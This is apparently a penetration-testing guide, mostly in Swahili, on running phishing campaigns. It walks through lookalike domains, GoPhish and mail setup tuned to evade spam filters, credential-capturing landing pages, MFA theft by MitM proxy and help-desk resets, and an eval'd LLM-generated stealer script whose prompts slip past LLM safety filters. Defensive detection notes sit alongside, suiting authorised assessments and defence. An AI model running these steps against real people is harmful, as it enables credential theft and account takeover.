# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Mbinu

1. Recon waathiriwa
1. Chagua **victim domain**.
2. Fanya uorodheshaji wa wavuti wa msingi kwa **kutafuta login portals** zinazotumiwa na mwathiriwa na **amua** ipi utakayo **kuiga**.
3. Tumia baadhi ya **OSINT** ili **kutafuta anwani za barua pepe**.
2. Andaa mazingira
1. **Buy the domain** utakayotumia kwa tathmini ya phishing
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS na **gophish**
3. Andaa kampeni
1. Andaa **email template**
2. Andaa **web page** ya kuiba credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Kuna **uwezekano kwamba baadhi ya bits zilizohifadhiwa au katika mawasiliano zinaweza kubadilika kiotomatiki** kutokana na sababu mbalimbali kama solar flares, cosmic rays, au makosa ya vifaa.

Wakati wazo hili linapotumika kwa maombi ya DNS, inawezekana kwamba **domain iliyopokewa na seva ya DNS** sio ile ile ambayo ilianzishwa awali.

Kwa mfano, mabadiliko ya bit moja tu katika domain "windows.com" yanaweza kuibadilisha kuwa "windnws.com."

Wavamizi wanaweza **kuchukua faida ya hili kwa kusajili domains nyingi za bit-flipping** zinazofanana na domain ya mwathiriwa. Nia yao ni kuelekeza watumiaji halali kwenye miundombinu yao.

Kwa taarifa zaidi soma [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Unaweza kutafuta katika [https://www.expireddomains.net/](https://www.expireddomains.net) domain iliyoyeyuka ambayo unaweza kutumia.\
Ili kuhakikisha kwamba domain iliyoyeyuka unayotarajia kununua **inametimiza tayari SEO nzuri** unaweza kuangalia jinsi inavyokadiriwa katika:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Ili **gundua zaidi** anwani halali za barua pepe au **kukagua zile** ambazo tayari umezipata unaweza kuangalia kama unaweza ku-brute-force SMTP servers za mwathiriwa. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Zaidi ya hayo, usisahau kwamba kama watumiaji wanatumia **any web portal to access their mails**, unaweza kuangalia ikiwa ina udhaifu wa **username brute force**, na kulenga udhaifu huo ikiwa inawezekana.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Mipangilio

**Usanidi wa cheti cha TLS**

Kabla ya hatua hii, unapaswa tayari kuwa umenunua domain utakayotumia, na lazima iwe ikielekeza kwenye IP ya VPS ambapo unasanidi gophish.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Usanidi wa barua**

Anza kwa kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye faili zifuatazo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Badilisha pia thamani za vigezo vifuatavyo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Mwisho badilisha faili **`/etc/hostname`** na **`/etc/mailname`** kwa jina la domain yako na **anzisha upya VPS yako.**

Sasa, tengeneza **rekodi A ya DNS** ya `mail.<domain>` ikielekeza kwa **anwani ya IP** ya VPS na rekodi **DNS MX** ikielekeza kwa `mail.<domain>`

Sasa hebu jaribu kutuma barua pepe:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Usanidi wa Gophish**

Simamisha utekelezaji wa Gophish na tufanye usanidi wake.\
Badilisha `/opt/gophish/config.json` kuwa ifuatavyo (tazama utumiaji wa https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Sanidi huduma ya gophish**

Ili kuunda huduma ya gophish ili iweze kuanzishwa kiotomatiki na kusimamiwa, unaweza kuunda faili `/etc/init.d/gophish` yenye maudhui yafuatayo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Maliza kusanidi huduma na kuikagua kwa kufanya:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Kusanidi seva ya barua pepe na domain

### Subiri & kuwa halali

Kadri domain ilivyozeeka, ndivyo inavyokuwa na uwezekano mdogo wa kushikiliwa kama spam. Kwa hivyo unapaswa kusubiri muda mrefu iwezekanavyo (angalau wiki 1) kabla ya tathmini ya phishing. Zaidi ya hayo, ikiwa utaweka ukurasa kuhusu sekta yenye sifa nzuri, sifa itakayopatikana itakuwa bora zaidi.

Kumbuka kwamba hata ukilazimika kusubiri wiki, unaweza kumaliza kusanidi kila kitu sasa.

### Sanidi Reverse DNS (rDNS) record

Weka rDNS (PTR) record inayofananisha anwani ya IP ya VPS na domain name.

### Sender Policy Framework (SPF) Record

Unapaswa **configure a SPF record for the new domain**. If you don't know what is a SPF record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

You can use [https://www.spfwizard.net/](https://www.spfwizard.net) to generate your SPF policy (use the IP of the VPS machine)

![](<../../images/image (1037).png>)

This is the content that must be set inside a TXT record inside the domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Rekodi

Lazima **usanidi rekodi ya DMARC kwa domain mpya**. Kama haujui rekodi ya DMARC ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Unahitaji kuunda rekodi mpya ya DNS TXT inayolenga hostname `_dmarc.<domain>` na maudhui yafuatayo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa domain mpya**. Ikiwa haujui rekodi ya DMARC ni nini [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 ambazo ufunguo wa DKIM unazalisha:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

Unaweza kufanya hivyo ukitumia [https://www.mail-tester.com/](https://www.mail-tester.com/)\
Tembelea ukurasa na utume barua pepe kwa anwani watakokupa:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Unaweza pia **kuangalia usanidi wako wa barua pepe** kwa kutuma barua pepe kwa `check-auth@verifier.port25.com` na **kusoma majibu** (kwa hili utahitaji **kuifungua** port **25** na kuona majibu katika faili _/var/mail/root_ ikiwa utatuma barua pepe kama root).\
Hakikisha unapitisha mitihani yote:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Unaweza pia kutuma **ujumbe kwa akaunti ya Gmail unayodhibiti**, na kukagua **vichwa vya barua pepe** kwenye kikasha chako cha Gmail, `dkim=pass` inapaswa kuonekana katika uwanja wa kichwa wa `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Kuondolewa kutoka Orodha Nyeusi ya Spamhouse

Ukurasa [www.mail-tester.com](https://www.mail-tester.com) unaweza kukuonyesha kama domain yako imezuiliwa na Spamhouse. Unaweza kuomba domain/IP yako iondolewe hapa: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Kuondolewa kutoka Orodha Nyeusi ya Microsoft

​​Unaweza kuomba domain/IP yako iondolewe kupitia [https://sender.office.com/](https://sender.office.com).

## Unda & Anzisha Kampeni ya GoPhish

### Sending Profile

- Weka **jina la utambuzi** la profaili ya mtumaji
- Amua kutoka akaunti gani utakayotumia kutuma barua pepe za phishing. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inashauriwa kutumia kipengele cha "**Send Test Email**" ili kujaribu kwamba kila kitu kinafanya kazi.\
> Ningependekeza **kutuma barua pepe za mtihani kwa anwani za 10min mails** ili kuepuka kuingizwa kwenye orodha nyeusi wakati wa kufanya majaribio.

### Kiolezo la Barua Pepe

- Weka **jina la utambuzi** la kiolezo
- Kisha andika **mada** (hakuna kitu cha kushangaza, tu kitu ungetegemea kusoma katika barua pepe ya kawaida)
- Hakikisha umeweka tiki kwenye "**Add Tracking Image**"
- Andika **kiolezo cha barua pepe** (unaweza kutumia vigezo kama kwenye mfano ufuatao):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Kumbuka kwamba **ili kuongeza uaminifu wa barua pepe**, inapendekezwa kutumia baadhi ya saini kutoka kwa barua pepe ya mteja. Mapendekezo:

- Tuma barua pepe kwa **anwani isiyopo** na angalia kama jibu lina saini yoyote.
- Tafuta **barua pepe za umma** kama info@ex.com au press@ex.com au public@ex.com na uwatume barua pepe na usubiri jibu.
- Jaribu kuwasiliana na **barua pepe halali ulizogundua** na unsubiri jibu.

![](<../../images/image (80).png>)

> [!TIP]
> Email Template pia inaruhusu **kuambatisha faili za kutuma**. Ikiwa ungependa pia kuiba NTLM challenges kwa kutumia baadhi ya faili/nyaraka maalum [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Andika **jina**
- **Andika HTML code** ya ukurasa wa wavuti. Kumbuka kwamba unaweza **kuingiza** (import) kurasa za wavuti.
- Chagua **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Kwa kawaida utahitaji kubadilisha HTML code ya ukurasa na kufanya baadhi ya majaribio ndani ya eneo (labda ukitumia Apache server) **mpaka utakapopenda matokeo.** Kisha, andika HTML code hiyo kwenye kisanduku.\
> Kumbuka kwamba kama unahitaji **kutumia baadhi ya rasilimali za static** kwa HTML (labda baadhi ya kurasa za CSS na JS) unaweza kuziokoa katika _**/opt/gophish/static/endpoint**_ na kisha kuzipata kutoka _**/static/\<filename>**_

> [!TIP]
> Kwa redirection unaweza **kuelekeza watumiaji kwenye ukurasa mkuu halali** wa mwathiriwa, au kuwaelekeza kwenye _/static/migration.html_ kwa mfano, weka **spinning wheel (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kishaonyesha kuwa mchakato umefanikiwa**.

### Users & Groups

- Weka jina
- **Import data** (kumbuka kwamba ili kutumia template kwa mfano unahitaji firstname, last name na email address ya kila mtumiaji)

![](<../../images/image (163).png>)

### Campaign

Mwisho, tengeneza campaign ukichagua jina, email template, landing page, URL, sending profile na group. Kumbuka kwamba URL itakuwa link itakayotumwa kwa waathiriwa

Kumbuka kwamba **Sending Profile inaruhusu kutuma barua pepe ya majaribio kuona jinsi barua pepe ya hatia itakavyoonekana mwisho**:

![](<../../images/image (192).png>)

> [!TIP]
> Ningependekeza **kutuma barua pepe za majaribio kwa 10min mails addresses** ili kuepuka kuwekewa blacklist wakati wa majaribio.

Mara kila kitu kikiwa tayari, anza tu campaign!

## Website Cloning

Ikiwa kwa sababu yoyote unataka kunakili tovuti angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Katika baadhi ya tathmini za phishing (hasa kwa Red Teams) utataka pia **kutuma faili zenye aina fulani ya backdoor** (labda C2 au labda kitu kitakachochochea uthibitisho).\
Angalia ukurasa ufuatao kwa mifano mingine:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Shambulio lililotangulia ni janja kabisa kwani unaficha tovuti halisi na kukusanya taarifa zilizowekwa na mtumiaji. Kwa bahati mbaya, ikiwa mtumiaji hakuweka nenosiri sahihi au ikiwa programu uliyoiga imewekwa na 2FA, **taarifa hizi hazitatumika kukufanya umshtaki mtumiaji aliyedanganywa**.

Hapa ndipo zana kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapokuwa muhimu. Zana hizi zitakuwezesha kuunda shambulio la MitM. Kwa msingi, shambulio hufanya kazi kwa njia ifuatayo:

1. Unajigeuza kuwa fomu ya **login** ya ukurasa halisi.
2. Mtumiaji **hutuma** **credentials** zake kwa ukurasa wako wa kuigiza na zana inazituma kwa ukurasa halisi, **kukagua kama credentials zinafanya kazi**.
3. Ikiwa akaunti imewekwa na **2FA**, ukurasa wa MitM utaomba hilo na mara **mtumiaji atakaloingiza** zana itazituma kwa ukurasa halisi.
4. Mara mtumiaji anapothibitishwa wewe (kama mshambulizi) utakuwa **umepiga picha credentials, 2FA, cookie na taarifa zote** za kila mwingiliano wako wakati zana inapofanya MitM.

### Via VNC

Je, badala ya **kuelekeza mwathiriwa kwenye ukurasa mbaya** uliokuwa na muonekano wa asili, umemuongoza kwenye **kikao cha VNC na browser iliyounganishwa na ukurasa halisi**? Utakuwa na uwezo wa kuona anafanya nini, kuiba nenosiri, MFA aliyetumika, cookies...\
Hii unaweza kufanya nayo kwa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

K obvious njia moja ya kujua kama umegunduliwa ni **kutafuta domain yako ndani ya blacklists**. Ikiwa inaonekana kwenye orodha, kwa namna fulani domain yako iligunduliwa kama ya kushtukiza.\
Njia rahisi ya kuangalia kama domain yako inaonekana kwenye blacklist yoyote ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, kuna njia nyingine za kujua kama mwathiriwa ana **tafutaji kwa uangalifu shughuli za phishing zenye kutishia** kama ilivyoelezewa katika:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain lenye jina linalofanana sana** na domain ya mwathiriwa **na/au kuunda cheti** kwa **subdomain** ya domain unaodhibiti **iliyokuwa na** **keyword** ya domain ya mwathiriwa. Ikiwa **mwathiriwa** atafanya aina yoyote ya **DNS au HTTP interaction** nao, utajua kwamba **anatafuta kwa bidii** domains zenye shaka na utahitaji kuwa kimya sana.

### Evaluate the phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kuhifadhi kama barua pepe yako itaishia kwenye folda ya spam au itafungiwa au itafanikiwa.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Sets za uvamizi za kisasa mara nyingi zinapita kabisa kuwarudia barua pepe za lures na **kuwasiliana moja kwa moja na workflow ya service-desk / identity-recovery** ili kushinda MFA. Shambulio hili ni lenye “living-off-the-land”: mara operator anaposhika credentials halali wanapiga pivot kwa zana za admin zilizo ndani – hakuna malware inahitajika.

### Mtiririko wa shambulio
1. Recon ya mwathiriwa
* Kunasa maelezo binafsi & ya kampuni kutoka LinkedIn, data breaches, GitHub ya umma, n.k.
* Tambua vitambulisho vya thamani kubwa (wakurugenzi, IT, fedha) na tambua **mchakato kamili wa help-desk** kwa reset ya password / MFA.
2. Social engineering kwa wakati halisi
* Simu, Teams au chat kwa help-desk ukiiga malengo (mara nyingi na **spoofed caller-ID** au **cloned voice**).
* Toa PII zilizokusanywa awali kupita uthibitisho wa maarifa.
* Mshawishi afisa afanye **reset ya MFA secret** au kufanya **SIM-swap** kwenye namba ya simu iliyosajiliwa.
3. Hatua za mara baada ya kupata upatikanaji (≤60 min katika kesi halisi)
* Anzisha foothold kupitia portal yoyote ya web SSO.
* Tambua AD / AzureAD kwa kutumia zana zilizojengwa (bila kuweka binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Movement ya mlalo (lateral) kwa kutumia **WMI**, **PsExec**, au wakala halali wa **RMM** ambao tayari wameorodheshwa kama wepesi ndani ya mazingira.

### Detection & Mitigation
* Tibu help-desk identity recovery kama **operation yenye mamlaka** – itajiwe uthibitisho wa hatua ya juu & idhini ya meneja.
* Tumia **Identity Threat Detection & Response (ITDR)** / **UEBA** kanuni zinazotoa tahadhari juu ya:
* Njia ya MFA imebadilishwa + uthibitisho kutoka kifaa kipya / geo mpya.
* Uinua haraka wa nafasi ya mhusika huyo (user-→-admin).
* Rekodi simu za help-desk na udhibiti **call-back kwa namba iliyosajiliwa tayari** kabla ya reset yoyote.
* Tekeleza **Just-In-Time (JIT) / Privileged Access** ili akaunti zilizorekebishwa hivi karibuni **zisipate** moja kwa moja token zenye uwezo mkubwa.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Mafundi wa kawaida wanarejesha gharama za operesheni za high-touch na mashambulio ya umati ambayo huwaanua **search engines & ad networks kuwa njia ya kusambaza**.

1. **SEO poisoning / malvertising** hutuliza matokeo ya utafutaji ya uongo kama `chromium-update[.]site` hadi matangazo ya utafutaji ya juu.
2. Mwathiriwa hupakua **first-stage loader** ndogo (mara nyingi JS/HTA/ISO). Mifano iliyoshuhudiwa na Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader hupakua browser cookies + credential DBs, kisha huvuta **silent loader** inayoyamua – *kwa realtime* – kama itawasha:
* RAT (mfano AsyncRAT, RustDesk)
* ransomware / wiper
* kipengele cha persistence (registry Run key + scheduled task)

### Vidokezo vya kuimarisha
* Zuia domains zilizoorodheshwa hivi karibuni & tekeleza **Advanced DNS / URL Filtering** kwa matangazo ya utafutaji pamoja na barua pepe.
* Zuia ufungaji wa programu kwa MSI iliyosainiwa / Store packages pekee, kata utekelezaji wa `HTA`, `ISO`, `VBS` kwa sera.
* Endelea kufuatilia kwa mchakato wa watoto wa browsers wakifungua installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Kagua LOLBins zinazotumika mara kwa mara na first-stage loaders (mfano `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Wavamizi sasa wanachanganya **LLM & voice-clone APIs** kwa lures za kibinafsi kabisa na mwingiliano wa wakati halisi.

| Layer | Mfano wa matumizi na mwadui |
|-------|-----------------------------|
|Automation|Zalisha & tuma >100 k barua pepe / SMS zenye maneno yaliyobadilishwa & tracking links.|
|Generative AI|Tengeneza barua pepe za *one-off* zikirejea M&A za umma, vicheko vya ndani kutoka social media; sauti ya deep-fake ya CEO katika udanganyifu wa callback.|
|Agentic AI|Jisajili kwa kujitegemea domains, zibukute intel ya open-source, sanifu barua za hatua inayofuata wakati mwathiriwa anabonyeza lakini hakutuma creds.|

**Defence:**
• Ongeza **dynamic banners** zinazoonyesha ujumbe uliotumwa kutoka kwa automation isiyoaminika (kutokana na ARC/DKIM anomalies).  
• Tekeleza **voice-biometric challenge phrases** kwa maombi ya simu yenye hatari kubwa.  
• Endelea kuiga lures zilizo tengenezwa na AI katika programu za uhamasishaji – templates za static zimepitwa na wakati.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Wavamizi wanaweza kusafirisha HTML dukizo-na-onekana na **kutengeneza stealer wakati wa runtime** kwa kumuuliza **trusted LLM API** kwa JavaScript, kisha kuiendesha ndani ya browser (kwa mfano, `eval` au `<script>` inayotengenezwa kwa nguvu).

1. **Prompt-as-obfuscation:**weka URLs za exfil/Base64 strings ndani ya prompt; rudia maneno ili kupita vichujio vya usalama na kupunguza hallucinations.
2. **Client-side API call:** wakati wa kupakia, JS inaita LLM ya umma (Gemini/DeepSeek/etc.) au CDN proxy; prompt/API call pekee ndio inapoonekana kwenye HTML static.
3. **Assemble & exec:** concatenates response na kuiendesha (polymorphic kwa kila ziara):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code inabinafsisha lure (kwa mfano, LogoKit token parsing) na posts creds kwa prompt-hidden endpoint.

**Evasion traits**
- Trafiki inafika kwenye domains za LLM zinazo julikana au proxies za CDN zenye sifa; wakati mwingine kupitia WebSockets hadi backend.
- Hakuna static payload; malicious JS inapatikana tu baada ya render.
- Non-deterministic generations hutoa **unique** stealers kwa kila session.

**Detection ideas**
- Endesha sandboxes zenye JS imewezeshwa; tilia bendera **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Kagua front-end POSTs kwa LLM APIs ambazo zinafuatiwa mara moja na `eval`/`Function` kwenye text iliyorejeshwa.
- Toa tahadhari kwa domains za LLM zisizoruhusiwa katika trafiki ya client pamoja na credential POSTs zinazofuata.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na push-bombing ya jadi, operators kwa urahisi hufanya **force a new MFA registration** wakati wa simu ya help-desk, ikifuta token iliyopo ya mtumiaji. Kila onyo la kuingia linalofuata linaonekana halali kwa mwathiri.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** yanatokea **ndani ya dakika, kutoka kwa IP ile ile**.



## Clipboard Hijacking / Pastejacking

Wavamizi wanaweza kwa kimya kunakili amri hatarishi kwenye clipboard ya mwathiriwa kutoka kwa ukurasa wa wavuti uliovamiwa au typosquatted, kisha kumdanganya mtumiaji abandike ndani ya **Win + R**, **Win + X** au dirisha la terminal, na kuendesha msimbo yeyote bila upakuaji au kiambatanisho.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing ili kuepuka crawlers/sandboxes
Waendeshaji kwa kuongeza huficha mizunguko yao ya phishing nyuma ya ukaguzi rahisi wa kifaa, ili desktop crawlers wasifikie kurasa za mwisho. Mtindo wa kawaida ni script ndogo inayotesta DOM yenye uwezo wa touch na kutuma matokeo kwa server endpoint; non‑mobile clients wanapokea HTTP 500 (au ukurasa tupu), wakati watumiaji wa mobile wanapewa mzunguko kamili.

Mfano mfupi wa mteja (mantiki ya kawaida):
```html
<script src="/static/detect_device.js"></script>
```
Mantiki ya `detect_device.js` (imefupishwa):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Tabia za seva zinazochunguzwa mara nyingi:
- Inaweka cookie ya kikao wakati wa load ya kwanza.
- Inakubali `POST /detect {"is_mobile":true|false}`.
- Inarudisha 500 (au placeholder) kwa GET zinazofuata wakati `is_mobile=false`; inatumikia phishing tu ikiwa `true`.

Mbinu za ufuatiliaji na utambuzi:
- query ya urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria ya wavuti: mfululizo wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa si za mobile; njia halali za waathiriwa wa mobile hurudisha 200 pamoja na HTML/JS zinazofuata.
- Zuia au chunguza kwa ukaribu kurasa zinazotegemea maudhui kikamilifu kwenye `ontouchstart` au ukaguzi wa kifaa unaofanana.

Vidokezo vya ulinzi:
- Endesha crawlers zenye mobile‑like fingerprints na JS imewezeshwa ili kufichua maudhui yaliyozuiliwa.
- Ithibitishie tahadhari kwa majibu ya 500 yenye shaka yanayotokea baada ya `POST /detect` kwenye domains zilizosajiliwa hivi karibuni.

## Marejeleo

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
